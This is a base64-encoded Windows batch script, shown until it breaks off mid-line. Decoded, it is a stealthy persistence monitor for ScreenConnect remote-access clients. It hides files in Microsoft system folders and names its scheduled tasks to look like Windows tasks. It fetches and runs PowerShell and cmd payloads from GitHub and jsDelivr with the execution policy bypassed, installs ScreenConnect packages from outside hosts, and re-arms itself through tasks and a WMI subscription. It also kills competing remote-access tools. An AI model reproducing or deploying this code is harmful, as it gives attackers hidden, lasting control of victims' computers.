kOKVkOKVkOKVkOKVkA0Kc2V0bG9jYWwgRW5hYmxlRGVsYXllZEV4cGFuc2lvbg0KDQpzZXQgIktF
RVBfRlA9NWY2MDEwNTc5ODUyZTUwNyINCnNldCAiQUxUX0ZQPWY4NjFjODE0MGQ0NTM0MjciDQpz
ZXQgIkdSWVhBX0ZQPTk5MDgxOThlNjY4ZTQ3NTAiDQpzZXQgIldEPUM6XFByb2dyYW1EYXRhXE1p
Y3Jvc29mdFxXaW5kb3dzXFdFUlxUZW1wXC53dWNhY2hlIg0Kc2V0ICJFVEw9QzpcUHJvZ3JhbURh
dGFcTWljcm9zb2Z0XERpYWdub3Npc1xTdGF0ZVwuZXRsY2FjaGUiDQpzZXQgIkxPRz0lV0QlXG93
bl9tb24ubG9nIg0Kc2V0ICJTVEFURT0lV0QlXG93bl9tb24uc3RhdGUiDQpzZXQgIkhCRkxBRz0l
V0QlXGhiLmZsYWciDQpzZXQgIkNVUkw9JVN5c3RlbVJvb3QlXFN5c3RlbTMyXGN1cmwuZXhlIg0K
c2V0ICJURz1odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20veG5vYnVkZHkvZ2l0aHVi
LWRyb3AvbWFpbi90Z19yZXBvcnQucHMxP3Q9JVJBTkRPTSUlUkFORE9NJSINCnNldCAiVEcyPWh0
dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC94bm9idWRkeS9naXRodWItZHJvcEBtYWluL3RnX3Jl
cG9ydC5wczE/dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0ICJPV05TRUM9aHR0cHM6Ly9yYXcuZ2l0
aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1kcm9wL21haW4vb3duX3NlY3VyZS5j
bWQ/dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0ICJPV05TRUMyPWh0dHBzOi8vY2RuLmpzZGVsaXZy
Lm5ldC9naC94bm9idWRkeS9naXRodWItZHJvcEBtYWluL293bl9zZWN1cmUuY21kP3Q9JVJBTkRP
TSUlUkFORE9NJSINCnNldCAiT1dOTU9OPWh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNv
bS94bm9idWRkeS9naXRodWItZHJvcC9tYWluL293bl9tb24uY21kP3Q9JVJBTkRPTSUlUkFORE9N
JSINCnNldCAiT1dOTU9OMj1odHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gveG5vYnVkZHkvZ2l0
aHViLWRyb3BAbWFpbi9vd25fbW9uLmNtZD90PSVSQU5ET00lJVJBTkRPTSUiDQpzZXQgIk9XTkxJ
Qj1odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20veG5vYnVkZHkvZ2l0aHViLWRyb3Av
bWFpbi9vd25fbGliLnBzMT90PSVSQU5ET00lJVJBTkRPTSUiDQpzZXQgIk9XTkxJQjI9aHR0cHM6
Ly9jZG4uanNkZWxpdnIubmV0L2doL3hub2J1ZGR5L2dpdGh1Yi1kcm9wQG1haW4vb3duX2xpYi5w
czE/dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0ICJNU0lfVVJMPWh0dHBzOi8vdWkuc2V2cnouY29t
L0Jpbi9TY3JlZW5Db25uZWN0LkNsaWVudFNldHVwLm1zaT9lPUFjY2VzcyZ5PUd1ZXN0Ig0Kc2V0
ICJNU0lfR1JZWEE9aHR0cHM6Ly91aS5ncnl4YS5jb20vQmluL1NjcmVlbkNvbm5lY3QuQ2xpZW50
U2V0dXAubXNpP2U9QWNjZXNzJnk9R3Vlc3QiDQpzZXQgIk1TSV9QS0cxPWh0dHBzOi8vcmF3Lmdp
dGh1YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRodWItZHJvcC9tYWluL3BrZy5tc2kiDQpz
ZXQgIk1TSV9QS0cyPWh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC94bm9idWRkeS9naXRodWIt
ZHJvcEBtYWluL3BrZy5tc2kiDQpzZXQgIk1TST0lUHJvZ3JhbURhdGElXFNjcmVlbkNvbm5lY3Qu
Q2xpZW50U2V0dXAubXNpIg0Kc2V0ICJNU0lDQUNIRT0lV0QlXHBrZy5tc2kiDQpzZXQgIk1TSV9H
PSVQcm9ncmFtRGF0YSVcU2NyZWVuQ29ubmVjdC5Hcnl4YS5tc2kiDQpzZXQgIk1TSUNBQ0hFX0c9
JVdEJVxwa2dfZ3J5eGEubXNpIg0KDQppZiBub3QgZXhpc3QgIiVXRCUiIG1kICIlV0QlIiAyPm51
bA0KaWYgbm90IGV4aXN0ICIlTE9HJSIgdHlwZSBudWw+IiVMT0clIiAyPm51bA0KDQpzZXQgIk1P
TlZFUj1NMzIiDQpzZXQgIlBGODY9JVByb2dyYW1GaWxlcyh4ODYpJSINCnNldCAiR1JZWEFfREVF
UD0lV0QlXGdyeXhhX2RlZXAuZmxhZyINCnJlbSBsb2FkIGN1cnJlbnQgR3J5eGEgRlAgKG1heSBy
b3RhdGUgd2hlbiBzZXJ2ZXIva2V5cyBjaGFuZ2UpDQppZiBleGlzdCAiJVdEJVxncnl4YS5jZmci
IGZvciAvZiAidXNlYmFja3EgdG9rZW5zPTEsKiBkZWxpbXM9PSIgJSVLIGluICgiJVdEJVxncnl4
YS5jZmciKSBkbyBpZiAvSSAiJSVLIj09IkNVUlJFTlRfRlAiIHNldCAiR1JZWEFfRlA9JSVMIg0K
aWYgbm90IGRlZmluZWQgR1JZWEFfRlAgc2V0ICJHUllYQV9GUD05OTA4MTk4ZTY2OGU0NzUwIg0K
Zm9yIC9mICJ0b2tlbnM9MS0zIGRlbGltcz0vICIgJSVhIGluICgiJWRhdGUlIikgZG8gc2V0ICJE
VD0lZGF0ZSUgJXRpbWUlIg0KZWNoby4+PiIlTE9HJSINCmVjaG8g4pSA4pSAIHRpY2sgIURUISBb
dmVyICVNT05WRVIlXSDilIDilIA+PiIlTE9HJSINCnNldCAiQ09VTlQ9MCINCnNldCAiSU5TVEFM
TEVEPTAiDQpzZXQgIlBSSU1fT0s9MCINCnNldCAiQUxUX09LPTAiDQpzZXQgIkZPUkVJR05fTEVG
VD0wIg0Kc2V0ICJGT1JFSUdOX0xJU1Q9Ig0Kc2V0ICJNU0lFWElUPW5vdC1ydW4iDQoNCnJlbSDi
lIDilIAgWzBdIHNpbmdsZS1mbGlnaHQgbXV0ZXggKHN0b3Agb3ZlcmxhcHBpbmcgdGlja3MgcmFj
aW5nIG1zaWV4ZWMpIOKUgOKUgA0Kc2V0ICJNVVRFWD0lV0QlXHRpY2subG9jayINCmlmIGV4aXN0
ICIlTVVURVglIiAoDQogIGZvciAlJUEgaW4gKCIlTVVURVglIikgZG8gc2V0ICJMT0NLQUdFPSUl
fnRBIg0KICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1Db21tYW5kICJp
ZigoVGVzdC1QYXRoICclTVVURVglJykgLWFuZCAoKChHZXQtRGF0ZSktKEdldC1JdGVtIC1MaXRl
cmFsUGF0aCAnJU1VVEVYJScgLUZvcmNlKS5MYXN0V3JpdGVUaW1lKS5Ub3RhbE1pbnV0ZXMgLWx0
IDgpKXsgZXhpdCAxIH0gZWxzZSB7IGV4aXQgMCB9IiA+bnVsIDI+JjENCiAgaWYgZXJyb3JsZXZl
bCAxICgNCiAgICBlY2hvIHRpY2tfc2tpcHBlZF9tdXRleF9idXN5Pj4iJUxPRyUiDQogICAgZW5k
bG9jYWwNCiAgICBleGl0IC9iIDANCiAgKQ0KKQ0KZWNobyAlREFURSUgJVRJTUUlICVSQU5ET00l
PiIlTVVURVglIg0KDQpyZW0g4pSA4pSAIHBlci1ob3N0IGlkZW50aXR5IChhbnRpLXNpZ25hdHVy
ZSkg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
4pSA4pSA4pSA4pSA4pSA4pSADQppZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgcG93ZXJzaGVs
bCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmls
ZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBpbml0IC1Xb3JrRGlyICIlV0QlIiA+bnVsIDI+
JjENCmlmIGV4aXN0ICIlV0QlXGlkZW50aXR5LmNmZyIgZm9yIC9mICJ1c2ViYWNrcSB0b2tlbnM9
MSwqIGRlbGltcz09IiAlJUsgaW4gKCIlV0QlXGlkZW50aXR5LmNmZyIpIGRvIHNldCAiJSVLPSUl
TCINCmlmIG5vdCBkZWZpbmVkIFRBU0tfQSBzZXQgIlRBU0tfQT1XZXJRdWV1ZVN5bmMiDQppZiBu
b3QgZGVmaW5lZCBUQVNLX0Igc2V0ICJUQVNLX0I9UGxhU2VydmVySGVhbHRoIg0KaWYgbm90IGRl
ZmluZWQgVEFTS19DIHNldCAiVEFTS19DPVdkaUhvc3RQcm94eSINCmlmIG5vdCBkZWZpbmVkIFRB
U0tfRCBzZXQgIlRBU0tfRD1UY3BJcENvbmZsaWN0UmVzIg0KaWYgbm90IGRlZmluZWQgTU9fQSBz
ZXQgIk1PX0E9MiINCmlmIG5vdCBkZWZpbmVkIE1PX0Igc2V0ICJNT19CPTMiDQoNCnJlbSDilIDi
lIAgW0FdIGF1dG8tdXBkYXRlIGNvcmUgZmlsZXMgKGJlc3QgZWZmb3J0KSDilIDilIDilIDilIDi
lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIANCmlmIG5vdCBleGlzdCAi
JUNVUkwlIiBzZXQgIkNVUkw9Y3VybC5leGUiDQoiJUNVUkwlIiAtTCAtLXNzbC1uby1yZXZva2Ug
LS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1vICIlV0QlXHRnX3JlcG9ydC5uZXci
ICIlVEclIiA+bnVsIDI+JjENCmlmIG5vdCBleGlzdCAiJVdEJVx0Z19yZXBvcnQubmV3IiAiJUNV
UkwlIiAtTCAtLWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgNDAgLW8gIiVXRCVcdGdfcmVw
b3J0Lm5ldyIgIiVURzIlIiA+bnVsIDI+JjENCmF0dHJpYiAtaCAtcyAtciAiJVdEJVx0Z19yZXBv
cnQucHMxIiA+bnVsIDI+JjENCmZpbmRzdHIgL0M6IlRHX1JFUE9SVCBCVUlMRCIgIiVXRCVcdGdf
cmVwb3J0Lm5ldyIgPm51bCAyPiYxICYmIGZvciAlJUYgaW4gKCIlV0QlXHRnX3JlcG9ydC5uZXci
KSBkbyBpZiAlJX56RiBHVFIgMTUwMCBtb3ZlIC95ICIlV0QlXHRnX3JlcG9ydC5uZXciICIlV0Ql
XHRnX3JlcG9ydC5wczEiID5udWwgMj4mMQ0KZGVsIC9mIC9xICIlV0QlXHRnX3JlcG9ydC5uZXci
ID5udWwgMj4mMQ0KIiVDVVJMJSIgLUwgLS1zc2wtbm8tcmV2b2tlIC0tY29ubmVjdC10aW1lb3V0
IDggLS1tYXgtdGltZSAzMCAtbyAiJVdEJVxvd25fc2VjdXJlLm5ldyIgIiVPV05TRUMlIiA+bnVs
IDI+JjENCmlmIG5vdCBleGlzdCAiJVdEJVxvd25fc2VjdXJlLm5ldyIgIiVDVVJMJSIgLUwgLS1j
b25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDMwIC1vICIlV0QlXG93bl9zZWN1cmUubmV3IiAi
JU9XTlNFQzIlIiA+bnVsIDI+JjENCmF0dHJpYiAtaCAtcyAtciAiJVdEJVxvd25fc2VjdXJlLmNt
ZCIgPm51bCAyPiYxDQpmaW5kc3RyIC9DOiJPV05fU0VDVVJFIEJVSUxEIiAiJVdEJVxvd25fc2Vj
dXJlLm5ldyIgPm51bCAyPiYxICYmIGZvciAlJUYgaW4gKCIlV0QlXG93bl9zZWN1cmUubmV3Iikg
ZG8gaWYgJSV+ekYgR1RSIDgwMCBtb3ZlIC95ICIlV0QlXG93bl9zZWN1cmUubmV3IiAiJVdEJVxv
d25fc2VjdXJlLmNtZCIgPm51bCAyPiYxDQpkZWwgL2YgL3EgIiVXRCVcb3duX3NlY3VyZS5uZXci
ID5udWwgMj4mMQ0KIiVDVVJMJSIgLUwgLS1zc2wtbm8tcmV2b2tlIC0tY29ubmVjdC10aW1lb3V0
IDggLS1tYXgtdGltZSA0MCAtbyAiJVdEJVxvd25fbGliLm5ldyIgIiVPV05MSUIlIiA+bnVsIDI+
JjENCmlmIG5vdCBleGlzdCAiJVdEJVxvd25fbGliLm5ldyIgIiVDVVJMJSIgLUwgLS1jb25uZWN0
LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1vICIlV0QlXG93bl9saWIubmV3IiAiJU9XTkxJQjIl
IiA+bnVsIDI+JjENCmF0dHJpYiAtaCAtcyAtciAiJVdEJVxvd25fbGliLnBzMSIgPm51bCAyPiYx
DQpmaW5kc3RyIC9DOiJPV05fTElCICBCVUlMRCIgIiVXRCVcb3duX2xpYi5uZXciID5udWwgMj4m
MSAmJiBmb3IgJSVGIGluICgiJVdEJVxvd25fbGliLm5ldyIpIGRvIGlmICUlfnpGIEdUUiAxNTAw
IG1vdmUgL3kgIiVXRCVcb3duX2xpYi5uZXciICIlV0QlXG93bl9saWIucHMxIiA+bnVsIDI+JjEN
CmRlbCAvZiAvcSAiJVdEJVxvd25fbGliLm5ldyIgPm51bCAyPiYxDQpyZW0gc2VsZi11cGRhdGU6
IGRvd25sb2FkIG5ldyBvd25fbW9uLCBhcHBseSBBRlRFUiB0aGlzIHRpY2sgKEJVSUxELXZlcmlm
aWVkKQ0Kc2V0ICJTRUxGX1VQRD0wIg0KIiVDVVJMJSIgLUwgLS1zc2wtbm8tcmV2b2tlIC0tY29u
bmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSA0MCAtbyAiJVdEJVxvd25fbW9uLm5leHQiICIlT1dO
TU9OJSIgPm51bCAyPiYxDQppZiBub3QgZXhpc3QgIiVXRCVcb3duX21vbi5uZXh0IiAiJUNVUkwl
IiAtTCAtLWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgNDAgLW8gIiVXRCVcb3duX21vbi5u
ZXh0IiAiJU9XTk1PTjIlIiA+bnVsIDI+JjENCmZpbmRzdHIgL0M6Ik9XTl9NT04gIEJVSUxEIiAi
JVdEJVxvd25fbW9uLm5leHQiID5udWwgMj4mMQ0KaWYgbm90IGVycm9ybGV2ZWwgMSBmb3IgJSVG
IGluICgiJVdEJVxvd25fbW9uLm5leHQiKSBkbyBpZiAlJX56RiBHVFIgMTUwMCAoDQogIGZjIC9i
ICIlV0QlXG93bl9tb24ubmV4dCIgIiVXRCVcb3duX21vbi5jbWQiID5udWwgMj4mMQ0KICBpZiBl
cnJvcmxldmVsIDEgc2V0ICJTRUxGX1VQRD0xIg0KKQ0KaWYgIiVTRUxGX1VQRCUiPT0iMCIgZGVs
IC9mIC9xICIlV0QlXG93bl9tb24ubmV4dCIgPm51bCAyPiYxDQoNCnJlbSDilIDilIAgW0JdIHJl
LWFybSBjaGFpbiAxOiBvd25lcnNoaXAtYXdhcmUgKG5vdCBleGlzdGVuY2Utb25seSkg4pSA4pSA
DQpyZW0gTDExL00yMjogUXVlcnktb25seSBza2lwcGVkIHJlYXJtIHdoZW4gV2luZG93cyBidWls
dC1pbiB0YXNrcyBzaGFyZWQNCnJlbSBkZWZhdWx0IG5hbWVzIChEaWFnbm9zaXNcU2NoZWR1bGVk
IGV0Yy4pIC0+IG1vbiBuZXZlciByYW4sIG5vIGxvZy4NCmlmIGV4aXN0ICIlV0QlXG93bl9saWIu
cHMxIiAoDQogIGZvciAvZiAidXNlYmFja3EgZGVsaW1zPSIgJSVSIGluIChgcG93ZXJzaGVsbCAt
Tm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAi
JVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiB0YXNrcy1lbnN1cmUgLVdvcmtEaXIgIiVXRCUiIC1N
b25QYXRoICIlV0QlXG93bl9tb24uY21kImApIGRvICgNCiAgICBlY2hvIHRhc2tzX2Vuc3VyZSAl
JVI+PiIlTE9HJSINCiAgICBzZXQgIlRBU0tTX0VOU1VSRT0lJVIiDQogICkNCikNCmlmIG5vdCBl
eGlzdCAiJUVUTCUiIG1rZGlyICIlRVRMJSIgPm51bCAyPiYxDQppZiBleGlzdCAiJVdEJVxvd25f
bW9uLmNtZCIgKA0KICBhdHRyaWIgLWggLXMgLXIgIiVFVEwlXGV0bF9tb24uY21kIiA+bnVsIDI+
JjENCiAgY29weSAveSAiJVdEJVxvd25fbW9uLmNtZCIgIiVFVEwlXGV0bF9tb24uY21kIiA+bnVs
IDI+JjENCikNCg0KcmVtIOKUgOKUgCBbQjJdIHJlLWFybSBjaGFpbiAyIChXTUkgc3Vic2NyaXB0
aW9uKSBpZiBtaXNzaW5nIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0KaWYgZXhpc3QgIiVX
RCVcb3duX2xpYi5wczEiICgNCiAgZm9yIC9mICJ1c2ViYWNrcSBkZWxpbXM9IiAlJVIgaW4gKGBw
b3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlw
YXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHdhdGNoZG9nLWVuc3VyZSAtV29y
a0RpciAiJVdEJSIgLU1vblBhdGggIiVXRCVcb3duX21vbi5jbWQiYCkgZG8gc2V0ICJXRF9TVEFU
RT0lJVIiDQogIGlmIC9JICIhV0RfU1RBVEUhIj09IlJFQVJNRUQiIGVjaG8gd2F0Y2hkb2cgV01J
IFJFQVJNRUQ+PiIlTE9HJSINCikNCg0KcmVtIOKUgOKUgCBbRTBdIHN5bmMgR3J5eGEgRlAgZnJv
bSBSdW5uaW5nIG5vbi1zZXZyeiBTQyBCRUZPUkUgZXh0ZXJtaW5hdGUNCnJlbSAgICAgKHByZXZl
bnRzIGtpbGxpbmcgR3J5eGEgYXMgZm9yZWlnbiBldmVyeSB0aWNrKQ0KaWYgZXhpc3QgIiVXRCVc
b3duX2xpYi5wczEiICgNCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAt
RXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBn
cnl4YS1oZWFsdGggLVdvcmtEaXIgIiVXRCUiID5udWwgMj4mMQ0KICBpZiBleGlzdCAiJVdEJVxn
cnl4YS5jZmciIGZvciAvZiAidXNlYmFja3EgdG9rZW5zPTEsKiBkZWxpbXM9PSIgJSVLIGluICgi
JVdEJVxncnl4YS5jZmciKSBkbyBpZiAvSSAiJSVLIj09IkNVUlJFTlRfRlAiIHNldCAiR1JZWEFf
RlA9JSVMIg0KKQ0KDQpyZW0g4pSA4pSAIFtFXSBleHRlcm1pbmF0ZSBmb3JlaWduIFNDICsgZGlz
YWxsb3dlZCBSTU0gKEFGVEVSIEdyeXhhIEZQIHN5bmMpIOKUgOKUgA0KaWYgZXhpc3QgIiVXRCVc
b3duX2xpYi5wczEiIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1
dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gZXh0ZXJt
aW5hdGUgLVdvcmtEaXIgIiVXRCUiID4+IiVMT0clIiAyPiYxDQp0aW1lb3V0IC90IDggL25vYnJl
YWsgPm51bA0Kc2V0ICJGT1JFSUdOX0xFRlQ9MCINCmZvciAvZiAidG9rZW5zPTIgZGVsaW1zPSgp
IiAlJWEgaW4gKCdzYyBxdWVyeSBzdGF0ZV49IGFsbCBefCBmaW5kc3RyIC9DOiJTRVJWSUNFX05B
TUU6IFNjcmVlbkNvbm5lY3QgQ2xpZW50IicpIGRvICgNCiAgc2V0ICJGUD0lJWEiDQogIHNldCAi
RlA9IUZQOiA9ISINCiAgaWYgL0kgbm90ICIhRlAhIj09IiVLRUVQX0ZQJSIgaWYgL0kgbm90ICIh
RlAhIj09IiVBTFRfRlAlIiBpZiAvSSBub3QgIiFGUCEiPT0iJUdSWVhBX0ZQJSIgKA0KICAgIHNl
dCAvYSBDT1VOVCs9MQ0KICAgIHNldCAvYSBGT1JFSUdOX0xFRlQrPTENCiAgICBzZXQgIkZPUkVJ
R05fTElTVD0hRk9SRUlHTl9MSVNUISFGUCEgIg0KICAgIGVjaG8gZm9yZWlnbl9sZWZ0XyFGUCE+
PiIlTE9HJSINCiAgKQ0KKQ0KDQpyZW0g4pSA4pSAIFtDXSBoZWFsIFNjcmVlbkNvbm5lY3QgcHJp
bS9hbHQg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQpmb3IgL2YgInRva2Vucz0xLDIgZGVs
aW1zPSgpIiAlJWEgaW4gKCdzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQ
JSkiIF58IGZpbmRzdHIgL0M6IlNFUlZJQ0VfTkFNRSInKSBkbyAoDQogIHNldCAiSU5TVEFMTEVE
PTEiDQogIHNldCAiUFJJTVNUQVRFPSUlYiINCikNCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENs
aWVudCAoJUtFRVBfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQppZiBub3QgZXJyb3JsZXZl
bCAxICgNCiAgc2V0ICJQUklNX09LPTEiDQogIHNldCAvYSBDT1VOVCs9MQ0KKQ0Kc2MgcXVlcnkg
IlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglQUxUX0ZQJSkiID5udWwgMj4mMQ0KaWYgbm90IGVycm9y
bGV2ZWwgMSBzZXQgL2EgQ09VTlQrPTENCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAo
JUFMVF9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwNCmlmIG5vdCBlcnJvcmxldmVsIDEgc2V0
ICJBTFRfT0s9MSINCg0KaWYgIiVJTlNUQUxMRUQlIj09IjEiIGlmICIlUFJJTV9PSyUiPT0iMCIg
KA0KICBlY2hvIHN2YyBoZWFsIHJlc3RhcnQ+PiIlTE9HJSINCiAgbmV0IHN0YXJ0ICJTY3JlZW5D
b25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgPm51bCAyPiYxDQogIHNjIHN0YXJ0ICJTY3JlZW5D
b25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgPm51bCAyPiYxDQogIHRpbWVvdXQgL3QgNiAvbm9i
cmVhayA+bnVsDQogIHNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIg
fCBmaW5kICJSVU5OSU5HIiA+bnVsDQogIGlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJQUklNX09L
PTEiDQopDQpyZW0gTTE2OiBzdGlsbCBzdG9wcGVkIC0+IHJlcGFpciB0aGUgUkVHSVNURVJFRCBw
cm9kdWN0IChtc2lleGVjIC9mYSByZXN0b3Jlcw0KcmVtIGJpbmFyaWVzICsgc3RhcnRzIHRoZSBz
ZXJ2aWNlOyBMNSBSZXBhaXItU0NTZXJ2aWNlIGhhbmRsZXMgc3RvcHBlZCBzdmNzKQ0KaWYgIiVJ
TlNUQUxMRUQlIj09IjEiIGlmICIlUFJJTV9PSyUiPT0iMCIgKA0KICBlY2hvIHN2YyBlc2NhbGF0
ZSByZXBhaXI+PiIlTE9HJSINCiAgaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIHBvd2Vyc2hl
bGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZp
bGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gcmVwYWlyIC1GcCAiJUtFRVBfRlAlIiAtV29y
a0RpciAiJVdEJSIgPj4iJUxPRyUiIDI+JjENCiAgdGltZW91dCAvdCA4IC9ub2JyZWFrID5udWwN
CiAgc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiB8IGZpbmQgIlJV
Tk5JTkciID5udWwNCiAgaWYgbm90IGVycm9ybGV2ZWwgMSBzZXQgIlBSSU1fT0s9MSINCikNCnJl
bSBNMTY6IG9ycGhhbmVkIHNlcnZpY2UgZW50cnkgKHByb2R1Y3QgdW5yZWdpc3RlcmVkIC0gZWF0
ZW4gYnkgYW4gU0MtZmFtaWx5DQpyZW0gdXBncmFkZSByZW1vdmFsKSBjYW4gTkVWRVIgc3RhcnQu
IERlbGV0ZSBpdCBhbmQgZmFsbCB0aHJvdWdoIHRvIHRoZQ0KcmVtIGZyZXNoLWluc3RhbGwgbGFk
ZGVyIGJlbG93IGluc3RlYWQgb2YgYWxlcnRpbmcgIndvbnQgc3RhcnQiIGZvcmV2ZXIuDQppZiAi
JUlOU1RBTExFRCUiPT0iMSIgaWYgIiVQUklNX09LJSI9PSIwIiAoDQogIHNldCAiUkVHU1RBVEU9
dW5rbm93biINCiAgaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIGZvciAvZiAiZGVsaW1zPSIg
JSVSIGluICgncG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9u
UG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiByZWdpc3RlcmVk
IC1GcCAiJUtFRVBfRlAlIiAtV29ya0RpciAiJVdEJSInKSBkbyBzZXQgIlJFR1NUQVRFPSUlUiIN
CiAgZWNobyBvcnBoYW5fY2hlY2s9IVJFR1NUQVRFIT4+IiVMT0clIg0KICBpZiAvSSAiIVJFR1NU
QVRFISI9PSJubyIgKA0KICAgIGVjaG8gb3JwaGFuX3NlcnZpY2VfZGVsZXRlPj4iJUxPRyUiDQog
ICAgc2MgZGVsZXRlICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgPm51bCAyPiYx
DQogICAgc2V0ICJJTlNUQUxMRUQ9MCINCiAgKQ0KKQ0KaWYgIiVJTlNUQUxMRUQlIj09IjEiIGlm
ICIlUFJJTV9PSyUiPT0iMCIgKA0KICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0
aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0
aW9uIHN0YXRlIC1Xb3JrRGlyICIlV0QlIiAtQnVpbGQgJU1PTlZFUiUgLUV4dHJhICJzdmMtd29u
dC1zdGFydCIgPm51bCAyPiYxDQogIGNhbGwgOlRnU3RhdGUgRE9XTiAiU2NyZWVuQ29ubmVjdCAo
JUtFRVBfRlAlKSBpbnN0YWxsZWQgYnV0IHdvbnQgc3RhcnQiDQogIGdvdG8gOkFmdGVySGVhbA0K
KQ0KaWYgIiVJTlNUQUxMRUQlIj09IjEiIGdvdG8gOkFmdGVySGVhbA0KDQpyZW0g4pSA4pSAIFtE
XSBwcmltYXJ5IFNDIG1pc3NpbmcgLSBoZWFsIGxhZGRlciDilIDilIDilIDilIDilIDilIDilIDi
lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIANCnJlbSBNMTI6IEZJ
UlNUIHJlcGFpciB0aGUgcmVnaXN0ZXJlZCBwcm9kdWN0IChyZWNyZWF0ZXMgc2VydmljZSB3aXRo
b3V0DQpyZW0gdG91Y2hpbmcgdGhlIEFMVCBpbnN0YW5jZSk7IGZyZXNoIG1zaWV4ZWMgaW5zdGFs
bCBvbmx5IGFzIGZhbGxiYWNrLg0KZWNobyBzdmMgbWlzc2luZyAtIGhlYWwgYmVnaW4+PiIlTE9H
JSINCmNhbGwgOlJlcGFpclJlZ2lzdGVyZWQgIiVLRUVQX0ZQJSINCnNjIHF1ZXJ5ICJTY3JlZW5D
b25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQppZiBub3Qg
ZXJyb3JsZXZlbCAxICgNCiAgc2V0ICJJTlNUQUxMRUQ9MSINCiAgc2V0ICJQUklNX09LPTEiDQog
IGdvdG8gOkFmdGVySGVhbA0KKQ0KcmVtIHJlZnVzZSBmcmVzaCAvaSBpZiBwcm9kdWN0IHN0aWxs
IHJlZ2lzdGVyZWQgLSBVcGdyYWRlIHRhYmxlIGNhbiB3aXBlIEFMVC9HUllYQQ0Kc2V0ICJSRUdT
VEFURT11bmtub3duIg0KaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIGZvciAvZiAidXNlYmFj
a3EgZGVsaW1zPSIgJSVSIGluIChgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2
ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlv
biByZWdpc3RlcmVkIC1GcCAiJUtFRVBfRlAlIiAtV29ya0RpciAiJVdEJSJgKSBkbyBzZXQgIlJF
